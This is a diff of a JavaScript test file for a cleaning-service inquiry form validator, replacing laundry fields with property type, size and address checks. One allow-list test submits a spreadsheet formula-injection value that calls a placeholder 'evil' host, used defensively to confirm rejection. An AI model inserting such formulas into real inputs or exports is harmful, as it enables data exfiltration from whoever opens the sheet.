@@ -6,13 +6,13 @@ const valid = {
   name: "Juan Dela Cruz",
   phone: "0917 123 4567",
   email: "Juan@Example.com",
-  service: "Wash & Fold",
-  amount: "3 bags",
-  serviceType: "Pickup",
-  address: "12 Mabini St, Brgy. Uno",
+  service: "Deep Cleaning",
+  propertyType: "Condo / Apartment",
+  propertySize: "2 bedrooms, about 45 sqm",
+  address: "12 Lacson St, Brgy. Mandalagan, Bacolod City",
   preferredDate: "2026-10-10",
   preferredTime: "Morning",
-  message: "Please wash whites separately.",
+  message: "Please focus on the kitchen and bathrooms.",
 };
 
 test("accepts a complete inquiry and normalizes it", () => {
@@ -23,14 +23,20 @@ test("accepts a complete inquiry and normalizes it", () => {
   assert.equal(values.email, "juan@example.com");
 });
 
-test("requires name, phone, service and service type", () => {
+test("requires name, phone, service, property type and address", () => {
   const { errors } = validateInquiry({});
-  assert.deepEqual(Object.keys(errors).sort(), ["name", "phone", "service", "serviceType"]);
+  assert.deepEqual(Object.keys(errors).sort(), ["address", "name", "phone", "propertyType", "service"]);
   assert.equal(errors.name, "Please enter your full name.");
+  assert.equal(errors.address, "Please enter the address of the place to be cleaned.");
+});
+
+test("size, email, date and time are optional", () => {
+  const minimal = { name: "Ana Reyes", phone: "09171234567", service: "House Cleaning", propertyType: "House", address: "5 Rizal St, Bacolod" };
+  assert.ok(validateInquiry(minimal).valid);
 });
 
 test("accepts Philippine mobile and landline formats", () => {
-  for (const phone of ["09171234567", "+63 917 123 4567", "639171234567", "(02) 8123-4567", "032 123 4567"]) {
+  for (const phone of ["09171234567", "+63 917 123 4567", "639171234567", "(034) 433-1234", "034 433 1234"]) {
     assert.equal(validateInquiry({ ...valid, phone }).errors.phone, undefined, phone);
   }
 });
@@ -46,11 +52,10 @@ test("email is optional but must be valid when given", () => {
   assert.ok(validateInquiry({ ...valid, email: "not-an-email" }).errors.email);
 });
 
-test("address is required for pickup or delivery, dropped for drop-off", () => {
+test("address is always required and must be more than a few characters", () => {
   assert.ok(validateInquiry({ ...valid, address: "" }).errors.address);
-  const dropOff = validateInquiry({ ...valid, serviceType: "Drop-off", address: "should not be stored" });
-  assert.equal(dropOff.errors.address, undefined);
-  assert.equal(dropOff.values.address, "");
+  assert.ok(validateInquiry({ ...valid, address: "abc" }).errors.address);
+  assert.equal(validateInquiry({ ...valid, address: "12 Rizal St" }).errors.address, undefined);
 });
 
 test("rejects past and impossible dates", () => {
@@ -65,12 +70,19 @@ test("enforces length limits", () => {
 });
 
 test("server allow-lists reject tampered options", () => {
-  const allowed = { service: ["Wash & Fold"], serviceType: ["Drop-off", "Pickup"], preferredTime: ["Morning"] };
+  const allowed = { service: ["Deep Cleaning"], propertyType: ["House", "Condo / Apartment"], preferredTime: ["Morning"] };
   const { errors } = validateInquiry(
-    { ...valid, service: "=IMPORTXML(\"http://evil\")", serviceType: "Teleport", preferredTime: "3am" },
+    { ...valid, service: "=IMPORTXML(\"http://evil\")", propertyType: "Castle", preferredTime: "3am" },
     { allowed },
   );
-  assert.ok(errors.service && errors.serviceType && errors.preferredTime);
+  assert.ok(errors.service && errors.propertyType && errors.preferredTime);
+});
+
+test("drops unknown keys, such as the old laundry fields", () => {
+  const { values } = validateInquiry({ ...valid, serviceType: "Pickup", amount: "3 bags", secret: "x" });
+  assert.deepEqual(Object.keys(values).sort(), [
+    "address", "email", "message", "name", "phone", "preferredDate", "preferredTime", "propertySize", "propertyType", "service",
+  ]);
 });
 
 test("ignores non-string input and strips control characters", () => {
